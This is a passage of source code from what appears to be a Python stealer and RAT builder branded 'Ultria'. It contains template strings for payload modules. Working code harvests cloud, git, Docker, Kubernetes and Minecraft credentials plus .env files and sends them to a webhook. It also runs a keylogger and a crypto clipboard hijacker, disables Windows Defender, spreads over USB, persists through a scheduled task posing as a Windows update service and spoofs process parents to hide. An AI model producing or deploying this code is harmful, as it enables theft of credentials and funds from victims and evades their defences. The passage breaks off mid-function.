        "        if v4r_envlines: v4r_sections['System Env Vars'] = v4r_envlines\n"
        "        for v4r_fp,v4r_lbl in [\n"
        "            (v4r_envios.path.join(v4r_home,'.aws','credentials'), 'AWS credentials'),\n"
        "            (v4r_envios.path.join(v4r_home,'.aws','config'),      'AWS config'),\n"
        "        ]:\n"
        "            if v4r_envios.path.isfile(v4r_fp):\n"
        "                try:\n"
        "                    with open(v4r_fp,'r',errors='ignore') as v4r_f: v4r_sections[v4r_lbl] = [l.rstrip() for l in v4r_f if l.strip()]\n"
        "                except: pass\n"
        "        v4r_git = v4r_envios.path.join(v4r_home, '.gitconfig')\n"
        "        if v4r_envios.path.isfile(v4r_git):\n"
        "            try:\n"
        "                with open(v4r_git,'r',errors='ignore') as v4r_f: v4r_sections['.gitconfig'] = [l.rstrip() for l in v4r_f if l.strip()]\n"
        "            except: pass\n"
        "        v4r_gcred = v4r_envios.path.join(v4r_home, '.git-credentials')\n"
        "        if v4r_envios.path.isfile(v4r_gcred):\n"
        "            try:\n"
        "                with open(v4r_gcred,'r',errors='ignore') as v4r_f: v4r_sections['Git Credentials'] = [l.rstrip() for l in v4r_f if l.strip()]\n"
        "            except: pass\n"
        "        v4r_npm = v4r_envios.path.join(v4r_home, '.npmrc')\n"
        "        if v4r_envios.path.isfile(v4r_npm):\n"
        "            try:\n"
        "                with open(v4r_npm,'r',errors='ignore') as v4r_f:\n"
        "                    v4r_npm_lines = [l.rstrip() for l in v4r_f if 'token' in l.lower() or 'auth' in l.lower() or '_authToken' in l]\n"
        "                    if v4r_npm_lines: v4r_sections['npm tokens (.npmrc)'] = v4r_npm_lines\n"
        "            except: pass\n"
        "        v4r_docker = v4r_envios.path.join(v4r_home, '.docker', 'config.json')\n"
        "        if v4r_envios.path.isfile(v4r_docker):\n"
        "            try:\n"
        "                with open(v4r_docker,'r',errors='ignore') as v4r_f: v4r_dcfg = v4r_envjson.load(v4r_f)\n"
        "                v4r_docker_lines = []\n"
        "                for v4r_reg, v4r_auth in v4r_dcfg.get('auths',{}).items():\n"
        "                    v4r_b64 = v4r_auth.get('auth','')\n"
        "                    if v4r_b64:\n"
        "                        try: v4r_dec = v4r_envb64.b64decode(v4r_b64).decode('utf-8','ignore')\n"
        "                        except: v4r_dec = v4r_b64\n"
        "                        v4r_docker_lines.append(f'{v4r_reg} → {v4r_dec}')\n"
        "                if v4r_docker_lines: v4r_sections['Docker Credentials'] = v4r_docker_lines\n"
        "            except: pass\n"
        "        v4r_kube = v4r_envios.path.join(v4r_home, '.kube', 'config')\n"
        "        if v4r_envios.path.isfile(v4r_kube):\n"
        "            try:\n"
        "                with open(v4r_kube,'r',errors='ignore') as v4r_f:\n"
        "                    v4r_klines = [l.rstrip() for l in v4r_f if any(k in l for k in ('token','server','user','name','certificate'))]\n"
        "                    if v4r_klines: v4r_sections['Kubernetes config'] = v4r_klines\n"
        "            except: pass\n"
        "        v4r_skip = {'.git','node_modules','__pycache__','.venv','venv','dist','build','.next','.nuxt'}\n"
        "        v4r_env_names = {'.env','.env.local','.env.production','.env.development','.env.staging','.env.test'}\n"
        "        for v4r_root, v4r_dirs, v4r_files in v4r_envios.walk(v4r_home):\n"
        "            v4r_dirs[:] = [d for d in v4r_dirs if d not in v4r_skip]\n"
        "            for v4r_fn in v4r_files:\n"
        "                if v4r_fn in v4r_env_names:\n"
        "                    try:\n"
        "                        with open(v4r_envios.path.join(v4r_root, v4r_fn),'r',errors='ignore') as v4r_ef:\n"
        "                            v4r_el = [l.strip() for l in v4r_ef if l.strip() and not l.strip().startswith('#')]\n"
        "                            if v4r_el: v4r_sections[v4r_envios.path.join(v4r_root,v4r_fn)[-100:]] = v4r_el\n"
        "                    except: pass\n"
        "        if not v4r_sections: return\n"
        "        v4r_tck = chr(96)*3\n"
        "        for v4r_title, v4r_lines in v4r_sections.items():\n"
        "            try:\n"
        "                v4r_body = v4r_tck + '\\n'.join(v4r_lines)[:4000] + v4r_tck\n"
        "                v4r_envrq.post('__WEBHOOK__', json={'embeds':[{'title':v4r_title,'description':v4r_body,'color':11206149}],'username':'Ultria'}, timeout=6)\n"
        "            except: pass\n"
        "    D3f_GetEnv()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('EnvVars: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_Minecraft = (
        "\ntry:\n"
        "    if globals().get('_v4r_skip_steal',False): raise SystemExit\n"
        "    import os as v4r_mcios, json as v4r_mcjson, requests as v4r_mcrq\n"
        "    def D3f_GetMinecraft():\n"
        "        v4r_found    = []\n"
        "        v4r_appdata  = v4r_mcios.environ.get('APPDATA','')\n"
        "        v4r_lappdata = v4r_mcios.environ.get('LOCALAPPDATA','')\n"
        "        v4r_home     = v4r_mcios.path.expanduser('~')\n"
        "        for v4r_fp in [\n"
        "            v4r_mcios.path.join(v4r_appdata, '.minecraft','launcher_profiles.json'),\n"
        "            v4r_mcios.path.join(v4r_appdata, '.minecraft','launcher_accounts.json'),\n"
        "        ]:\n"
        "            if not v4r_mcios.path.isfile(v4r_fp): continue\n"
        "            try:\n"
        "                with open(v4r_fp,'r',encoding='utf-8',errors='ignore') as v4r_f:\n"
        "                    v4r_data = v4r_mcjson.load(v4r_f)\n"
        "                v4r_accs = v4r_data.get('accounts', v4r_data.get('authenticationDatabase',{}))\n"
        "                for v4r_aid, v4r_aval in v4r_accs.items():\n"
        "                    v4r_name = v4r_aval.get('minecraftProfile',{}).get('name') or v4r_aval.get('displayName','?')\n"
        "                    v4r_tok  = v4r_aval.get('accessToken','?')\n"
        "                    v4r_found.append(f'Official | {v4r_name} | {v4r_tok}')\n"
        "            except: pass\n"
        "        for v4r_d, v4r_lbl in [\n"
        "            (v4r_mcios.path.join(v4r_appdata, 'MultiMC'),                         'MultiMC'),\n"
        "            (v4r_mcios.path.join(v4r_appdata, 'PrismLauncher'),                   'Prism'),\n"
        "            (v4r_mcios.path.join(v4r_lappdata, 'Programs', 'PrismLauncher'),      'Prism'),\n"
        "            (v4r_mcios.path.join(v4r_appdata, 'PolyMC'),                          'PolyMC'),\n"
        "            (v4r_mcios.path.join(v4r_appdata, 'ATLauncher'),                      'ATLauncher'),\n"
        "            (v4r_mcios.path.join(v4r_appdata, 'feralhosting'),                    'FTBLauncher'),\n"
        "            (v4r_mcios.path.join(v4r_lappdata, 'Programs', 'modrinth-app'),       'Modrinth'),\n"
        "        ]:\n"
        "            v4r_af = v4r_mcios.path.join(v4r_d, 'accounts.json')\n"
        "            if not v4r_mcios.path.isfile(v4r_af): continue\n"
        "            try:\n"
        "                with open(v4r_af,'r',encoding='utf-8',errors='ignore') as v4r_f:\n"
        "                    v4r_data = v4r_mcjson.load(v4r_f)\n"
        "                for v4r_acc in v4r_data.get('accounts', []):\n"
        "                    v4r_name  = v4r_acc.get('name', v4r_acc.get('username','?'))\n"
        "                    v4r_tok   = v4r_acc.get('accessToken', v4r_acc.get('ygg',{}).get('extra',{}).get('accessToken','?'))\n"
        "                    v4r_uuid  = v4r_acc.get('profile',{}).get('id', v4r_acc.get('uuid',''))\n"
        "                    v4r_found.append(f'{v4r_lbl} | {v4r_name} | uuid={v4r_uuid} | token={v4r_tok}')\n"
        "            except: pass\n"
        # TLauncher
        "        v4r_tl = v4r_mcios.path.join(v4r_appdata, '.tlauncher', 'data', 'users.cfg')\n"
        "        if v4r_mcios.path.isfile(v4r_tl):\n"
        "            try:\n"
        "                with open(v4r_tl,'r',encoding='utf-8',errors='ignore') as v4r_f: v4r_found.append('TLauncher: ' + v4r_f.read()[:500])\n"
        "            except: pass\n"
        # Lunar Client
        "        v4r_lunar = v4r_mcios.path.join(v4r_home, '.lunarclient', 'settings', 'game', 'accounts.json')\n"
        "        if v4r_mcios.path.isfile(v4r_lunar):\n"
        "            try:\n"
        "                with open(v4r_lunar,'r',encoding='utf-8',errors='ignore') as v4r_f:\n"
        "                    v4r_data = v4r_mcjson.load(v4r_f)\n"
        "                for v4r_acc in (v4r_data if isinstance(v4r_data, list) else v4r_data.get('accounts', [])):\n"
        "                    v4r_found.append(f'LunarClient | {v4r_acc.get(\"username\",\"?\")} | {v4r_acc.get(\"accessToken\",\"?\")}')\n"
        "            except: pass\n"
        # CurseForge / Overwolf
        "        v4r_cf = v4r_mcios.path.join(v4r_appdata, 'Overwolf', 'CurseForge', 'App.log')\n"
        "        for v4r_cfp in [\n"
        "            v4r_mcios.path.join(v4r_appdata, 'CurseForge', 'minecraft', 'launcher_accounts.json'),\n"
        "            v4r_mcios.path.join(v4r_lappdata, 'Overwolf', 'Extensions', 'curseforge', 'accounts.json'),\n"
        "        ]:\n"
        "            if v4r_mcios.path.isfile(v4r_cfp):\n"
        "                try:\n"
        "                    with open(v4r_cfp,'r',encoding='utf-8',errors='ignore') as v4r_f:\n"
        "                        v4r_data = v4r_mcjson.load(v4r_f)\n"
        "                    for v4r_k, v4r_v in v4r_data.get('accounts',{}).items():\n"
        "                        v4r_found.append(f'CurseForge | {v4r_v.get(\"displayName\",\"?\")} | {v4r_v.get(\"accessToken\",\"?\")}')\n"
        "                except: pass\n"
        # GDLauncher
        "        for v4r_gdl in [\n"
        "            v4r_mcios.path.join(v4r_appdata,'gdlauncher_next','userData','accounts.json'),\n"
        "            v4r_mcios.path.join(v4r_appdata,'gdlauncher_carbon','userData','accounts.json'),\n"
        "        ]:\n"
        "            if not v4r_mcios.path.isfile(v4r_gdl): continue\n"
        "            try:\n"
        "                with open(v4r_gdl,'r',encoding='utf-8',errors='ignore') as v4r_f:\n"
        "                    v4r_data = v4r_mcjson.load(v4r_f)\n"
        "                for v4r_acc in (v4r_data if isinstance(v4r_data, list) else []):\n"
        "                    v4r_found.append(f'GDLauncher | {v4r_acc.get(\"username\",\"?\")} | {v4r_acc.get(\"accessToken\",\"?\")}')\n"
        "            except: pass\n"
        "        if v4r_found:\n"
        "            v4r_tck = chr(96)*3\n"
        "            v4r_mcrq.post('__WEBHOOK__', json={'embeds':[{'title':f'Minecraft Sessions ({len(v4r_found)})','description':v4r_tck+'\\n'.join(v4r_found)[:4000]+v4r_tck,'color':11206149}],'username':'Ultria'}, timeout=8)\n"
        "    D3f_GetMinecraft()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('Minecraft: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_Keylogger = (
        "\ntry:\n"
        "    import threading as v4r_kthread, requests as v4r_krq, ctypes as v4r_kct, re as v4r_kre, time as v4r_ktime\n"
        "    def D3f_Keylogger():\n"
        "        try:\n"
        "            from pynput import keyboard as v4r_kbd\n"
        "        except: return\n"
        "        v4r_kbuf        = []\n"
        "        v4r_klimit      = 300\n"
        "        v4r_last_title  = ['']\n"
        "        v4r_last_cat    = ['']\n"
        "        v4r_last_url    = ['']\n"
        "        v4r_wh          = '__WEBHOOK__'\n"
        "        v4r_cat_rules = [\n"
        "            ('BROWSER',  ['chrome','firefox','edge','opera','brave','vivaldi','safari','internet explorer','navigateur']),\n"
        "            ('BANK',     ['paypal','bank','banking','banque','credit','debit','carte','wallet','coinbase','binance','kraken','stripe','revolut','n26','boursorama','caisse','credit agricole','societe generale','bnp','lcl','hsbc']),\n"
        "            ('EMAIL',    ['gmail','outlook','thunderbird','yahoo mail','protonmail','hotmail','mail','webmail','courrier']),\n"
        "            ('SOCIAL',   ['discord','telegram','whatsapp','messenger','instagram','twitter','tiktok','snapchat','facebook','reddit','slack','teams','skype','signal']),\n"
        "            ('GAME',     ['steam','epic games','minecraft','roblox','fortnite','valorant','league of legends','lol','csgo','cs2','gta','call of duty','pubg','apex','overwatch','battlenet']),\n"
        "            ('SECURITY', ['keepass','bitwarden','1password','lastpass','dashlane','authy','authenticator','antivirus','malwarebytes','defender','kaspersky','avast','norton']),\n"
        "            ('OFFICE',   ['word','excel','powerpoint','notepad','notepad++','vscode','visual studio','sublime','pycharm','intellij','notion','onenote','libreoffice']),\n"
        "            ('SYSTEM',   ['task manager','regedit','cmd','powershell','command prompt','control panel','settings','panneau','paramètres']),\n"
        "        ]\n"
        "        def v4r_classify(v4r_t):\n"
        "            v4r_tl = v4r_t.lower()\n"
        "            for v4r_cat, v4r_kws in v4r_cat_rules:\n"
        "                if any(v4r_kw in v4r_tl for v4r_kw in v4r_kws):\n"
        "                    return v4r_cat\n"
        "            return 'OTHER'\n"
        "        v4r_url_pat = v4r_kre.compile(r'[-a-zA-Z0-9@:%._+~#=]{1,256}\\.[a-zA-Z]{2,6}(?:[-a-zA-Z0-9@:%_+.~#?&=/]*)?')\n"
        "        def v4r_extract_url(v4r_t):\n"
        "            v4r_m = v4r_url_pat.search(v4r_t)\n"
        "            return v4r_m.group(0) if v4r_m else ''\n"
        "        v4r_kw_alert = ['password','passwd','parol','mdp','mot de passe','login','username','email','credit card','cvv','carte','iban','bic','swift','pin','2fa','otp','secret','token','api key']\n"
        "        def v4r_get_win():\n"
        "            try:\n"
        "                v4r_hwnd = v4r_kct.windll.user32.GetForegroundWindow()\n"
        "                v4r_ln   = v4r_kct.windll.user32.GetWindowTextLengthW(v4r_hwnd)\n"
        "                if v4r_ln == 0: return ''\n"
        "                v4r_b    = v4r_kct.create_unicode_buffer(v4r_ln + 1)\n"
        "                v4r_kct.windll.user32.GetWindowTextW(v4r_hwnd, v4r_b, v4r_ln + 1)\n"
        "                return v4r_b.value\n"
        "            except: return ''\n"
        "        def v4r_flush(v4r_alert=False):\n"
        "            if not v4r_kbuf: return\n"
        "            v4r_tck  = chr(96)*3\n"
        "            v4r_text = ''.join(v4r_kbuf)\n"
        "            v4r_kbuf.clear()\n"
        "            v4r_col  = 16711680 if v4r_alert else 11206149\n"
        "            v4r_cat  = v4r_last_cat[0]\n"
        "            v4r_url  = v4r_last_url[0]\n"
        "            v4r_win  = v4r_last_title[0]\n"
        "            v4r_desc = ''\n"
        "            if v4r_alert: v4r_desc += '⚠️ **SENSITIVE INPUT DETECTED**\\n'\n"
        "            v4r_desc += f'**App:** {v4r_cat}  |  **Window:** {v4r_win[:80]}\\n'\n"
        "            if v4r_url: v4r_desc += f'**URL/Domain:** {v4r_url}\\n'\n"
        "            v4r_desc += v4r_tck + v4r_text[:3800] + v4r_tck\n"
        "            try: v4r_krq.post(v4r_wh, json={'embeds':[{'title':'Keylogger','description':v4r_desc,'color':v4r_col}],'username':'Ultria'}, timeout=5)\n"
        "            except: pass\n"
        "        v4r_special_map = {'space':' ','enter':'\\n','tab':'\\t','backspace':'[⌫]','delete':'[DEL]','escape':'[ESC]','f1':'[F1]','f2':'[F2]','f3':'[F3]','f4':'[F4]','f5':'[F5]','f6':'[F6]','f7':'[F7]','f8':'[F8]','f9':'[F9]','f10':'[F10]','f11':'[F11]','f12':'[F12]','shift':'','shift_r':'','shift_l':'','ctrl_l':'','ctrl_r':'','alt_l':'','alt_r':'','alt_gr':'','caps_lock':'','num_lock':'','cmd':'','cmd_r':'','media_play_pause':'','media_volume_up':'','media_volume_down':'','media_next':'','media_previous':''}\n"
        "        def v4r_on_press(v4r_key):\n"
        "            v4r_win = v4r_get_win()\n"
        "            if v4r_win and v4r_win != v4r_last_title[0]:\n"
        "                v4r_last_title[0] = v4r_win\n"
        "                v4r_cat = v4r_classify(v4r_win)\n"
        "                v4r_last_cat[0] = v4r_cat\n"
        "                v4r_url = v4r_extract_url(v4r_win) if v4r_cat == 'BROWSER' else ''\n"
        "                v4r_last_url[0] = v4r_url\n"
        "                v4r_flush()\n"
        "                v4r_ts = v4r_ktime.strftime('%H:%M:%S')\n"
        "                v4r_kbuf.append(f'\\n── [{v4r_ts}] [{v4r_cat}] {v4r_win[:80]} ──\\n')\n"
        "            try: v4r_char = v4r_key.char or ''\n"
        "            except: v4r_char = None\n"
        "            if v4r_char is not None:\n"
        "                v4r_kbuf.append(v4r_char)\n"
        "            else:\n"
        "                v4r_name = str(v4r_key).replace('Key.','')\n"
        "                v4r_kbuf.append(v4r_special_map.get(v4r_name, f'[{v4r_name}]'))\n"
        "            if len(v4r_kbuf) >= v4r_klimit:\n"
        "                v4r_joined = ''.join(v4r_kbuf).lower()\n"
        "                v4r_is_alert = any(v4r_kw in v4r_joined for v4r_kw in v4r_kw_alert)\n"
        "                v4r_flush(v4r_is_alert)\n"
        # periodic flush every 45s
        "        def v4r_timer_flush():\n"
        "            while True:\n"
        "                v4r_ktime.sleep(45)\n"
        "                try:\n"
        "                    if v4r_kbuf:\n"
        "                        v4r_joined = ''.join(v4r_kbuf).lower()\n"
        "                        v4r_is_alert = any(v4r_kw in v4r_joined for v4r_kw in v4r_kw_alert)\n"
        "                        v4r_flush(v4r_is_alert)\n"
        "                except: pass\n"
        "        v4r_kthread.Thread(target=v4r_timer_flush, daemon=True).start()\n"
        "        v4r_klistener = v4r_kbd.Listener(on_press=v4r_on_press)\n"
        "        v4r_klistener.daemon = True\n"
        "        v4r_klistener.start()\n"
        "    D3f_Keylogger()\n"
        "except SystemExit: pass\n"
        "except Exception as v4r_em:\n"
        "    try: _v4r_t_errors.append('Keylogger: '+str(v4r_em)[:200])\n"
        "    except: pass\n"
    )

    T_ClipboardHijacker = (
        "\ntry:\n"
        "    import threading as v4r_chthread, ctypes as v4r_chct, time as v4r_chtime, re as v4r_chre\n"
        "    def D3f_ClipboardHijacker():\n"
        "        v4r_btc_addr = 'bc1q...'  # replace with attacker BTC address\n"
        "        v4r_eth_addr = '0x...'    # replace with attacker ETH address\n"
        "        v4r_btc_pat  = v4r_chre.compile(r'(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}')\n"
        "        v4r_eth_pat  = v4r_chre.compile(r'0x[a-fA-F0-9]{40}')\n"
        "        def v4r_get_clip():\n"
        "            v4r_val = ''\n"
        "            try:\n"
        "                if not v4r_chct.windll.user32.OpenClipboard(None): return v4r_val\n"
        "                try:\n"
        "                    v4r_h = v4r_chct.windll.user32.GetClipboardData(13)\n"
        "                    if v4r_h:\n"
        "                        v4r_pt = v4r_chct.windll.kernel32.GlobalLock(v4r_h)\n"
        "                        if v4r_pt:\n"
        "                            try: v4r_val = v4r_chct.wstring_at(v4r_pt)\n"
        "                            except: pass\n"
        "                            v4r_chct.windll.kernel32.GlobalUnlock(v4r_h)\n"
        "                finally:\n"
        "                    v4r_chct.windll.user32.CloseClipboard()\n"
        "            except: pass\n"
        "            return v4r_val\n"
        "        def v4r_set_clip(v4r_text):\n"
        "            try:\n"
        "                v4r_enc = (v4r_text + '\\0').encode('utf-16-le')\n"
        "                v4r_hg = v4r_chct.windll.kernel32.GlobalAlloc(0x0002, len(v4r_enc))\n"
        "                if not v4r_hg: return\n"
        "                v4r_pt = v4r_chct.windll.kernel32.GlobalLock(v4r_hg)\n"
        "                if not v4r_pt:\n"
        "                    v4r_chct.windll.kernel32.GlobalFree(v4r_hg); return\n"
        "                try:\n"
        "                    v4r_chct.memmove(v4r_pt, v4r_enc, len(v4r_enc))\n"
        "                finally:\n"
        "                    v4r_chct.windll.kernel32.GlobalUnlock(v4r_hg)\n"
        "                if not v4r_chct.windll.user32.OpenClipboard(None):\n"
        "                    v4r_chct.windll.kernel32.GlobalFree(v4r_hg); return\n"
        "                try:\n"
        "                    v4r_chct.windll.user32.EmptyClipboard()\n"
        "                    v4r_chct.windll.user32.SetClipboardData(13, v4r_hg)\n"
        "                finally:\n"
        "                    v4r_chct.windll.user32.CloseClipboard()\n"
        "            except: pass\n"
        "        def v4r_watch():\n"
        "            while True:\n"
        "                try:\n"
        "                    v4r_chtime.sleep(1)\n"
        "                    v4r_c = v4r_get_clip().strip()\n"
        "                    if v4r_btc_pat.fullmatch(v4r_c): v4r_set_clip(v4r_btc_addr)\n"
        "                    elif v4r_eth_pat.fullmatch(v4r_c): v4r_set_clip(v4r_eth_addr)\n"
        "                except: pass\n"
        "        v4r_cht = v4r_chthread.Thread(target=v4r_watch, daemon=True)\n"
        "        v4r_cht.start()\n"
        "    D3f_ClipboardHijacker()\n"
        "except: pass\n"
    )

    T_Melt = (
        "\ntry:\n"
        "    import os as v4r_mios, sys as v4r_msys, subprocess as v4r_msub, tempfile as v4r_mtmp\n"
        "    def D3f_Melt():\n"
        "        v4r_self = v4r_msys.executable if getattr(v4r_msys,'frozen',False) else __file__\n"
        "        v4r_bat = v4r_mtmp.NamedTemporaryFile(suffix='.bat', delete=False, mode='w')\n"
        "        v4r_bat.write(f':retry\\ndel /f /q \"{v4r_self}\"\\nif exist \"{v4r_self}\" goto retry\\ndel \"%~f0\"\\n')\n"
        "        v4r_bat.close()\n"
        "        v4r_msub.Popen(['cmd','/c',v4r_bat.name], creationflags=v4r_msub.CREATE_NO_WINDOW, close_fds=True)\n"
        "    D3f_Melt()\n"
        "except: pass\n"
    )

    T_DisableDefender = (
        "\ntry:\n"
        "    import subprocess as v4r_ddsub\n"
        "    def D3f_DisableDefender():\n"
        "        v4r_cmds = [\n"
        "            ['powershell','-WindowStyle','Hidden','-Command','Set-MpPreference -DisableRealtimeMonitoring $true'],\n"
        "            ['powershell','-WindowStyle','Hidden','-Command','Set-MpPreference -DisableBehaviorMonitoring $true'],\n"
        "            ['powershell','-WindowStyle','Hidden','-Command','Set-MpPreference -DisableBlockAtFirstSeen $true'],\n"
        "            ['powershell','-WindowStyle','Hidden','-Command','Add-MpPreference -ExclusionPath \"C:\\\\\"'],\n"
        "            ['reg','add','HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender','/v','DisableAntiSpyware','/t','REG_DWORD','/d','1','/f'],\n"
        "        ]\n"
        "        for v4r_c in v4r_cmds:\n"
        "            try: v4r_ddsub.run(v4r_c, stdout=v4r_ddsub.DEVNULL, stderr=v4r_ddsub.DEVNULL, creationflags=v4r_ddsub.CREATE_NO_WINDOW)\n"
        "            except: pass\n"
        "    D3f_DisableDefender()\n"
        "except: pass\n"
    )

    T_UsbSpreader = (
        "\ntry:\n"
        "    import threading as v4r_usbt, os as v4r_usbos, sys as v4r_usbsys, shutil as v4r_usbsh, time as v4r_usbtime\n"
        "    def D3f_UsbSpreader():\n"
        "        v4r_self = v4r_usbsys.executable if getattr(v4r_usbsys,'frozen',False) else v4r_usbos.path.abspath(__file__)\n"
        "        v4r_fname = v4r_usbos.path.basename(v4r_self)\n"
        "        def v4r_get_drives():\n"
        "            v4r_drives = []\n"
        "            for v4r_d in 'DEFGHIJKLMNOPQRSTUVWXYZ':\n"
        "                if v4r_usbos.path.exists(v4r_d+':\\\\'):\n"
        "                    v4r_drives.append(v4r_d+':\\\\')\n"
        "            return v4r_drives\n"
        "        def v4r_spread():\n"
        "            v4r_known = set(v4r_get_drives())\n"
        "            while True:\n"
        "                v4r_usbtime.sleep(3)\n"
        "                v4r_current = set(v4r_get_drives())\n"
        "                for v4r_new_drive in v4r_current - v4r_known:\n"
        "                    try:\n"
        "                        v4r_dst = v4r_usbos.path.join(v4r_new_drive, v4r_fname)\n"
        "                        if not v4r_usbos.path.exists(v4r_dst):\n"
        "                            v4r_usbsh.copy2(v4r_self, v4r_dst)\n"
        "                    except: pass\n"
        "                v4r_known = v4r_current\n"
        "        v4r_usbt.Thread(target=v4r_spread, daemon=True).start()\n"
        "    D3f_UsbSpreader()\n"
        "except: pass\n"
    )

    T_ScheduledTask = (
        "\ntry:\n"
        "    import subprocess as v4r_stsub, sys as v4r_stsys, os as v4r_stos\n"
        "    def D3f_ScheduledTask():\n"
        "        v4r_self = v4r_stsys.executable if getattr(v4r_stsys,'frozen',False) else v4r_stos.path.abspath(__file__)\n"
        "        v4r_task_name = 'WindowsUpdateHelperService'\n"
        "        v4r_stsub.run(\n"
        "            ['schtasks','/create','/tn',v4r_task_name,'/tr',v4r_self,\n"
        "             '/sc','onlogon','/rl','highest','/f'],\n"
        "            stdout=v4r_stsub.DEVNULL, stderr=v4r_stsub.DEVNULL,\n"
        "            creationflags=v4r_stsub.CREATE_NO_WINDOW\n"
        "        )\n"
        "    D3f_ScheduledTask()\n"
        "except: pass\n"
    )

    T_ProcessDisguise = (
        "\ntry:\n"
        "    import os as v4r_pdos, sys as v4r_pdsys, subprocess as v4r_pdsub, shutil as v4r_pdsh, random as v4r_pdrand, ctypes as v4r_pdct, ctypes.wintypes as v4r_pdwt\n"
        "    def D3f_ProcessDisguise():\n"
        "        _v4r_mtx = v4r_pdct.windll.kernel32.CreateMutexW(None, False, 'Global\\\\MicrosoftEdge_CoreSvc')\n"
        "        if v4r_pdct.windll.kernel32.GetLastError() == 183:\n"
        "            v4r_pdct.windll.kernel32.CloseHandle(_v4r_mtx)\n"
        "            v4r_pdos._exit(0)\n"
        "        v4r_self = v4r_pdsys.executable if getattr(v4r_pdsys,'frozen',False) else None\n"
        "        if not v4r_self: return\n"
        "        v4r_sys_names = ['RuntimeBroker.exe','WmiPrvSE.exe','SearchHost.exe','ctfmon.exe','dllhost.exe','sihost.exe','fontdrvhost.exe','smartscreen.exe','SecurityHealthHost.exe']\n"
        "        v4r_cur = v4r_pdos.path.basename(v4r_self)\n"
        "        if v4r_cur in v4r_sys_names: return\n"
        "        v4r_name = v4r_pdrand.choice(v4r_sys_names)\n"
        "        v4r_dest_dir = v4r_pdos.path.join(v4r_pdos.environ.get('APPDATA',''), 'Microsoft', 'Windows')\n"
        "        v4r_pdos.makedirs(v4r_dest_dir, exist_ok=True)\n"
        "        v4r_dest = v4r_pdos.path.join(v4r_dest_dir, v4r_name)\n"
        "        if not v4r_pdos.path.isfile(v4r_dest): v4r_pdsh.copy2(v4r_self, v4r_dest)\n"
        "        def _v4r_get_pid(pname):\n"
        "            try:\n"
        "                out = v4r_pdsub.check_output(['tasklist','/FI','IMAGENAME eq '+pname,'/FO','CSV','/NH'],\n"
        "                    stderr=v4r_pdsub.DEVNULL, creationflags=v4r_pdsub.CREATE_NO_WINDOW).decode('utf-8','ignore')\n"
        "                for l in out.strip().split('\\n'):\n"
        "                    p = l.strip().strip('\"').split('\",\"')\n"
        "                    if len(p)>=2 and p[0].lower()==pname.lower():\n"
        "                        return int(p[1])\n"
        "            except: pass\n"
        "            return None\n"
        "        def _v4r_ppid_spawn(exe, ppid):\n"
        "            try:\n"
        "                PROCESS_ALL_ACCESS = 0x1F0FFF\n"
        "                EX_SI_PRESENT = 0x00080000\n"
        "                ATTR_PARENT = 0x00020000\n"
        "                CNW = 0x08000000\n"
        "                class _SI(v4r_pdct.Structure):\n"
        "                    _fields_=[('cb',v4r_pdwt.DWORD),('lpR',v4r_pdwt.LPWSTR),('lpD',v4r_pdwt.LPWSTR),\n"
        "                              ('lpT',v4r_pdwt.LPWSTR),('x',v4r_pdwt.DWORD),('y',v4r_pdwt.DWORD),\n"
        "                              ('xs',v4r_pdwt.DWORD),('ys',v4r_pdwt.DWORD),('xc',v4r_pdwt.DWORD),\n"
        "                              ('yc',v4r_pdwt.DWORD),('fa',v4r_pdwt.DWORD),('fl',v4r_pdwt.DWORD),\n"
        "                              ('sw',v4r_pdwt.WORD),('cr2',v4r_pdwt.WORD),('lr2',v4r_pdct.c_void_p),\n"
        "                              ('si',v4r_pdwt.HANDLE),('so',v4r_pdwt.HANDLE),('se',v4r_pdwt.HANDLE)]\n"
        "                class _SIX(v4r_pdct.Structure):\n"
        "                    _fields_=[('si',_SI),('al',v4r_pdct.c_void_p)]\n"
        "                class _PI(v4r_pdct.Structure):\n"
        "                    _fields_=[('hp',v4r_pdwt.HANDLE),('ht',v4r_pdwt.HANDLE),\n"
        "                              ('pid',v4r_pdwt.DWORD),('tid',v4r_pdwt.DWORD)]\n"
        "                k=v4r_pdct.windll.kernel32\n"
        "                hp=k.OpenProcess(PROCESS_ALL_ACCESS,False,ppid)\n"
        "                if not hp: return False\n"
        "                sz=v4r_pdct.c_size_t(0)\n"
        "                k.InitializeProcThreadAttributeList(None,1,0,v4r_pdct.byref(sz))\n"
        "                al=v4r_pdct.create_string_buffer(sz.value)\n"
        "                k.InitializeProcThreadAttributeList(al,1,0,v4r_pdct.byref(sz))\n"
        "                ph=v4r_pdwt.HANDLE(hp)\n"
        "                k.UpdateProcThreadAttribute(al,0,ATTR_PARENT,v4r_pdct.byref(ph),v4r_pdct.sizeof(ph),None,None)\n"
        "                six=_SIX(); six.si.cb=v4r_pdct.sizeof(_SIX)\n"
        "                six.al=v4r_pdct.cast(al,v4r_pdct.c_void_p)\n"
        "                pi=_PI()\n"
        "                ok=k.CreateProcessW(exe,None,None,None,False,EX_SI_PRESENT|CNW,None,None,v4r_pdct.byref(six),v4r_pdct.byref(pi))\n"
        "                k.DeleteProcThreadAttributeList(al); k.CloseHandle(hp)\n"
        "                if ok: k.CloseHandle(pi.hp); k.CloseHandle(pi.ht); return True\n"
        "            except: pass\n"
        "            return False\n"
        "        v4r_ppid = _v4r_get_pid('explorer.exe')\n"
        "        if v4r_ppid and _v4r_ppid_spawn(v4r_dest, v4r_ppid):\n"
        "            v4r_pdos._exit(0)\n"
        # fallback to normal hidden launch if PPID spoof fails
        "        v4r_pdsub.Popen([v4r_dest]+v4r_pdsys.argv[1:], creationflags=v4r_pdsub.CREATE_NO_WINDOW|v4r_pdsub.DETACHED_PROCESS, close_fds=True)\n"
        "        v4r_pdos._exit(0)\n"
        "    D3f_ProcessDisguise()\n"
        "except: pass\n"
    )

    T_PolymorphicRepack = (
        "\ntry:\n"
        "    import threading as v4r_prt, os as v4r_pros, sys as v4r_prsys, time as v4r_prtime, random as v4r_prrand, subprocess as v4r_prsub\n"
        "    def D3f_PolymorphicRepack():\n"
        "        v4r_MARKER = b'\\x00\\xFF\\xDE\\xAD\\xBE\\xEF'\n"
        "        def v4r_repack():\n"
        "            while True:\n"
        "                v4r_prtime.sleep(86400)\n"
        "                try:\n"
        "                    v4r_self = v4r_prsys.executable if getattr(v4r_prsys,'frozen',False) else None\n"
